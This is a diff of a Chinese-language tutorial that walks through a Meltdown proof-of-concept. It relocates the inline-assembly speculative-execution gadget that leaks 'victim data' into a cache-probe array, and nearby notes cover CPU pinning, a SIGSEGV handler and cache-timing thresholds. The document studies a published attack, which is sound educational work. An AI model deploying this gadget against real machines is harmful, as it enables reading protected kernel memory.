@@ -106,50 +106,7 @@ tatic void pin_cpu0()
 
 上述代码将线程和CPU绑定，从而保证rax的数据可以被获取
 
-```
-asm volatile (
-
-		"1:\n\t"
-
-
-
-		".rept 300\n\t"
-
-		"add $0x141, %%rax\n\t"
-
-		".endr\n\t"
-
-
-
-		"movzx (%[addr]), %%eax\n\t"
-
-		"shl $12, %%rax\n\t"
-
-		"jz 1b\n\t"
-
-		"movzx (%[target], %%rax, 1), %%rbx\n"
-
-
-
-		"stopspeculate: \n\t"
-
-		"nop\n\t"
-
-		:
-
-		: [target] "r" (target_array),
-
-		  [addr] "r" (addr)
-
-		: "rax", "rbx"
-
-	);
-  
-  ```
-  
-  上述代码对应论文的汇编部分。通过预测执行的漏洞，将victim data泄露给rax
-  
-  ```
+ ```
   
   void sigsegv(int sig, siginfo_t *siginfo, void *context)
 
@@ -235,6 +192,53 @@ set_cache_hit_threshold(void)
 ```
 
 上述代码测试了访问cache和内存的时间，作为判断的标准。通过两次访问同一数据，导致第二次数据在cache中，从而测出cache的访问时间；通过将数据清出cache再访问，测出内存的访问时间。多次测量求平均值
+
+2. 执行（窃取）部分
+
+```
+asm volatile (
+
+		"1:\n\t"
+
+
+
+		".rept 300\n\t"
+
+		"add $0x141, %%rax\n\t"
+
+		".endr\n\t"
+
+
+
+		"movzx (%[addr]), %%eax\n\t"
+
+		"shl $12, %%rax\n\t"
+
+		"jz 1b\n\t"
+
+		"movzx (%[target], %%rax, 1), %%rbx\n"
+
+
+
+		"stopspeculate: \n\t"
+
+		"nop\n\t"
+
+		:
+
+		: [target] "r" (target_array),
+
+		  [addr] "r" (addr)
+
+		: "rax", "rbx"
+
+	);
+  
+  ```
+  
+  上述代码对应论文的汇编部分。通过预测执行的漏洞，将victim data泄露给rax
+  
+
 
 
 ```
